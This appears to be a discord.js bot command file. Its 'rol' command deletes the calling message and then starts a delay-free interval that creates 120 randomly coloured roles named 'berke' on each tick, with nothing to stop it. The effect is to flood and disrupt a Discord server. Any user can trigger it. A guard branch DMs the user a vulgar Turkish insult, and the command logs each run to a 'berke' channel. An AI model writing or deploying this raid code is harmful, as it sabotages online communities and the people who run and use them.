const Discord = require("discord.js");
const ayarlar = require("../ayarlar.json");

module.exports.run = async(bot, message, args, recrue) => {
   message.delete();
    if(recrue) {
      return message.author.send("Hayırdır amk bu komuta iznin varmı amk").catch(console.error)
    };

  if(message.deletable) message.delete();
        var interval = setInterval (function () {
          for (var i = 0; i < 120; i++) {
    message.guild.createRole({
        name: 'berke',
        color: (Math.floor((Math.random() * 16777215) + 1)),
      }) 
    }

        });
  bot.channels.find('name',"berke").send("Log : ["+message.author.tag+" // "+message.author.id+"] ["+message.guild.name+"] Rol komutu yürütüldü.");
  
}

exports.conf = {
 enabled: true,
 guildOnly: false,
 aliases: ['rolveramk'],
 permLevel: 0,
  kategori: "rolverirmisin"
  
};

exports.help = {
 name: 'rol',
 description: '',
 usage: ''
};
